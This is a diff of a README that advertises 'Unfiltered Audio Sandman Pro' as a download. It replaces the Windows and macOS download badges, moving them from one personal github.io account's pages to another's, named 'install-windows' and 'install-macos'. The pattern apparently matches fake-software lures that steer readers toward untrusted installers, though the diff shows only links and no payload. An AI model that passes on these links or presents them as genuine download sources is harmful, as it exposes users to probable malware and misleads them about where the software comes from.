@@ -28,7 +28,7 @@ Whether you're a newcomer just getting started or a seasoned pro looking for adv
 
 <div align="center">
 
-[![Download Unfiltered Audio Sandman Pro](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_UNFILTERED_AUDIO_SANDMAN_PRO-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://WalkerCelebrate.github.io/winpkg/)
+[![Download Unfiltered Audio Sandman Pro](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_UNFILTERED_AUDIO_SANDMAN_PRO-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://ForbiddenTechnician.github.io/install-windows/)
 
 </div>
 
@@ -62,8 +62,8 @@ Getting started with **Unfiltered Audio Sandman Pro** is quick and straightforwa
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-C2410C?style=for-the-badge&logo=windows&logoColor=white)](https://WalkerCelebrate.github.io/winpkg/)
-[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-C2410C?style=for-the-badge&logo=apple&logoColor=white)](https://WalkerCelebrate.github.io/macpkg/)
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-C2410C?style=for-the-badge&logo=windows&logoColor=white)](https://ForbiddenTechnician.github.io/install-windows/)
+[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-C2410C?style=for-the-badge&logo=apple&logoColor=white)](https://ForbiddenTechnician.github.io/install-macos/)
 
 </div>
 
